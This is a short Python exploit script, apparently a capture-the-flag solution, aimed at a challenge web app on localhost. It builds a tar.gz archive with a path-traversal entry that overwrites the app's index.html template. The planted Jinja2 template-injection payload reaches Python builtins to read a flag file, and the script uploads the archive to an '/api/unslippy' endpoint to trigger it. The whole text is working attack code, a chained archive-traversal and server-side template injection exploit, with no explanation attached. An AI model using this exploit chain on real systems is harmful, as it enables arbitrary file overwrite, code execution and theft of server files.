import tarfile
import io
import requests

s = requests.Session()

data = b"""
{{ get_flashed_messages.__globals__.__builtins__.open("/app/flag").read() }}
"""
name = "../../../../../../../../app/application/templates/index.html"

# zip slip chain ssti 

source_f = io.BytesIO(initial_bytes=data)
fh = io.BytesIO()
with tarfile.open(fileobj=fh, mode='w:gz') as tar:
    info = tarfile.TarInfo(name)
    info.size = len(data)
    tar.addfile(info, source_f)

with open('evil.tar.gz', 'wb') as f:
    f.write(fh.getvalue())


url = 'http://localhost:1337/'
r = s.post(url + '/api/unslippy', files={'file': fh.getvalue()})
print(r.text)
print(s.get(url).text)

